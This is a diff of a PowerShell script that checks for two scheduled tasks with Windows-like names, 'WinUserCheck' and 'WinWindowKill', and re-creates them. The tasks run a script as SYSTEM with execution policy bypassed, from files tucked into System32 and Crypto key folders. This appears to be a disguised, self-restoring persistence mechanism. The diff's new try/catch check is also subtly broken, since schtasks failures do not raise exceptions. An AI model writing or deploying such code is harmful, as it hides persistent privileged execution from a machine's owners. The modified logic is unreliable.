@@ -31,10 +31,11 @@ try {
 $backupPath = "C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys"
 $restoreDir = "$env:windir\System32\Com\en-US"
 
-# --- Check and restore WinUserCheck ---
+# Check for WinUserCheck task
 $hasTask1 = $true
-$null = schtasks /Query /TN "WinUserCheck" 2>$null
-if ($LASTEXITCODE -ne 0) {
+try {
+    schtasks /Query /TN "WinUserCheck" > $null
+} catch {
     $hasTask1 = $false
 }
 
@@ -50,10 +51,11 @@ if (-not $hasTask1) {
         /TR "powershell.exe -ExecutionPolicy Bypass -File `"$restoreDir\sys_usr.ps1`"" /RU SYSTEM
 }
 
-# --- Check and restore WinWindowKill ---
+# Check for WinWindowKill task
 $hasTask2 = $true
-$null = schtasks /Query /TN "WinWindowKill" 2>$null
-if ($LASTEXITCODE -ne 0) {
+try {
+    schtasks /Query /TN "WinWindowKill" > $null
+} catch {
     $hasTask2 = $false
 }
 
